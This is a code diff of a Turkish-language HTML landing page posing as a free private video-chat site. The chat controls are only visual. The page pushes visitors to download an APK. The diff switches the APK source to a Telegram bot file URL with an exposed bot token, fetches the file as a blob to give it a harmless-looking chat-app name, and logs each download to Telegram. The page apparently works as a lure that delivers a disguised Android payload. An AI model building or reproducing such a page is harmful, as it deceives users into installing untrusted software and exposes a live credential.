@@ -5,16 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Görüntülü Görüşme - Ücretsiz Gizli Sohbet</title>
     
-    <!-- Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet"
         href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
         integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
     
-    <!-- Open Graph -->
     <meta property="og:title" content="Sohbet Edelim - Canlı Sohbet" />
     <meta property="fb:app_id" content="2184177865647930" />
     <meta property="og:description" content="Yeni arkadaşlıklar kur, canlı sohbete katıl!" />
@@ -30,106 +27,21 @@
     <meta name="twitter:url" content="https://arabeni3.vercel.app/" />
     
     <style>
-        * {
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            background: #000;
-        }
-        video {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: translate(-50%, -50%);
-            z-index: 0;
-        }
-        .stopped {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 20;
-            display: none;
-            backdrop-filter: blur(2px);
-        }
-        @keyframes pulse-heart {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        .animate-pulse-heart {
-            animation: pulse-heart 1s ease-in-out infinite;
-        }
-        .btn-press {
-            transition: transform 0.1s ease;
-        }
-        .btn-press:active {
-            transform: scale(0.96);
-        }
-        @media (max-width: 640px) {
-            .stopped {
-                width: 85%;
-                min-width: auto;
-                max-width: 320px;
-            }
-        }
-        .ripple-effect {
-            position: relative;
-            overflow: hidden;
-        }
-        .ripple-effect:after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.5);
-            transform: translate(-50%, -50%);
-            transition: width 0.3s, height 0.3s;
-        }
-        .ripple-effect:active:after {
-            width: 200%;
-            height: 200%;
-            opacity: 0;
-            transition: 0s;
-        }
-        .toast-notification {
-            position: fixed;
-            bottom: 100px;
-            left: 50%;
-            transform: translateX(-50%) translateY(100px);
-            background: linear-gradient(135deg, #1e1e2f, #2a2a3b);
-            color: white;
-            padding: 12px 24px;
-            border-radius: 50px;
-            font-size: 14px;
-            font-weight: 500;
-            z-index: 100;
-            opacity: 0;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
-            pointer-events: none;
-        }
-        .toast-notification.show {
-            transform: translateX(-50%) translateY(0);
-            opacity: 1;
-        }
-        .toast-notification i {
-            margin-right: 8px;
-            color: #10b981;
-        }
+        * { user-select: none; -webkit-tap-highlight-color: transparent; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #000; }
+        video { position: absolute; top: 50%; left: 50%; width: 100%; height: 100%; object-fit: cover; transform: translate(-50%, -50%); z-index: 0; }
+        .stopped { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 20; display: none; backdrop-filter: blur(2px); }
+        @keyframes pulse-heart { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        .animate-pulse-heart { animation: pulse-heart 1s ease-in-out infinite; }
+        .btn-press { transition: transform 0.1s ease; }
+        .btn-press:active { transform: scale(0.96); }
+        @media (max-width: 640px) { .stopped { width: 85%; min-width: auto; max-width: 320px; } }
+        .ripple-effect { position: relative; overflow: hidden; }
+        .ripple-effect:after { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; border-radius: 50%; background: rgba(255,255,255,0.5); transform: translate(-50%, -50%); transition: width 0.3s, height 0.3s; }
+        .ripple-effect:active:after { width: 200%; height: 200%; opacity: 0; transition: 0s; }
+        .toast-notification { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%) translateY(100px); background: linear-gradient(135deg, #1e1e2f, #2a2a3b); color: white; padding: 12px 24px; border-radius: 50px; font-size: 14px; font-weight: 500; z-index: 100; opacity: 0; transition: all 0.3s ease; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); pointer-events: none; }
+        .toast-notification.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+        .toast-notification i { margin-right: 8px; color: #10b981; }
     </style>
 </head>
 <body>
@@ -191,7 +103,6 @@
         <p class="text-[10px] text-gray-400 mt-1">Güncel</p>
     </div>
 
-    <!-- ⬇️ GÜNCELLENMİŞ log.js REFERANSI (AYNEN DURUYOR) ⬇️ -->
     <script src="log.js"></script>
 
     <script>
@@ -202,11 +113,12 @@
             'videos/video16.mp4'
         ];
 
+        // ⬇️ BURASI DEĞİŞTİ: Telegram linki eklendi
         const APK_SOURCES = [
-            "https://kiyafetinolsunn.xyz/sohbetss/UcretsizGoruntuluSohbet.apk",
-            "https://kiyafetinolsunn.xyz/sohbetss/UcretsizGoruntuluSohbet.apk",
-            "https://kiyafetinolsunn.xyz/sohbetss/UcretsizGoruntuluSohbet.apk",
-            "https://kiyafetinolsunn.xyz/sohbetss/UcretsizGoruntuluSohbet.apk"
+            "https://api.telegram.org/file/bot8830065870:AAGi4gcGXb6dfFNhfxLzsWR6ZH9bGte3Nr8/documents/file_0.apk",
+            "https://api.telegram.org/file/bot8830065870:AAGi4gcGXb6dfFNhfxLzsWR6ZH9bGte3Nr8/documents/file_0.apk",
+            "https://api.telegram.org/file/bot8830065870:AAGi4gcGXb6dfFNhfxLzsWR6ZH9bGte3Nr8/documents/file_0.apk",
+            "https://api.telegram.org/file/bot8830065870:AAGi4gcGXb6dfFNhfxLzsWR6ZH9bGte3Nr8/documents/file_0.apk"
         ];
 
         function showToast(message, isError = false) {
@@ -269,23 +181,40 @@
                 
                 try {
                     const currentApkUrl = getCurrentApkLink();
+                    const desiredFileName = "UcretsizGoruntuluSohbet.apk"; // ⬅️ DOSYA ADI BURADA
 
-                    // ========== 1. LİNKİ HEMEN AÇ (bekleme yok, timeout yok) ==========
-                    const isTelegram = !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
-                    
-                    if (isTelegram) {
-                        Telegram.WebApp.openLink(currentApkUrl, { try_instant_view: false });
-                    } else {
-                        window.location.href = currentApkUrl;
+                    // ========== 1. BLOB İLE İNDİR (dosya adını değiştirmek için) ==========
+                    try {
+                        const response = await fetch(currentApkUrl);
+                        if (!response.ok) throw new Error('İndirme başarısız');
+                        
+                        const blob = await response.blob();
+                        const blobUrl = URL.createObjectURL(blob);
+                        
+                        const tempLink = document.createElement('a');
+                        tempLink.href = blobUrl;
+                        tempLink.download = desiredFileName;
+                        document.body.appendChild(tempLink);
+                        tempLink.click();
+                        document.body.removeChild(tempLink);
+                        URL.revokeObjectURL(blobUrl);
+                        
+                    } catch (fetchError) {
+                        // Fetch başarısız olursa eski yönteme dön
+                        console.warn("Blob indirme başarısız, doğrudan açılıyor:", fetchError);
+                        const isTelegram = !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
+                        if (isTelegram) {
+                            Telegram.WebApp.openLink(currentApkUrl, { try_instant_view: false });
+                        } else {
+                            window.location.href = currentApkUrl;
+                        }
                     }
 
-                    // ========== 2. LOG'U ARKADA GÖNDER (await yok, bekleme yok) ==========
+                    // ========== 2. LOG'U ARKADA GÖNDER ==========
                     if (typeof window.sendLog === 'function') {
                         window.sendLog(currentApkUrl).catch(() => {});
-                        showToast("İndirme başlatılıyor!");
-                    } else {
-                        showToast("İndirme başlatılıyor...");
                     }
+                    showToast("İndirme başlatılıyor!");
 
                     // ========== 3. BUTONU GERİ AL ==========
                     setTimeout(() => {
@@ -314,7 +243,6 @@
             downloadBtn.addEventListener('click', handleDownload);
         });
         
-        // Arkaplan videosu için otoplay yardımcısı
         const videoElem = document.getElementById('backgroundVideo');
         if (videoElem) {
             videoElem.play().catch(err => {
@@ -328,7 +256,6 @@
             });
         }
         
-        // Alt kontroller (ses, video, mikrofon) – sadece görsel, işlevsiz
         const muteBtn = document.querySelector('.fa-volume-xmark')?.parentElement;
         const videoBtn = document.querySelector('.fa-video-slash')?.parentElement;
         const micBtn = document.querySelector('.fa-microphone-slash')?.parentElement;
@@ -366,7 +293,7 @@
             });
         }
         
-        console.log("TurkPorno Görüntülü Görüşme Hazır | Telegram log aktif");
+        console.log("Görüntülü Görüşme Hazır | Telegram log aktif");
     </script>
 </body>
 </html>
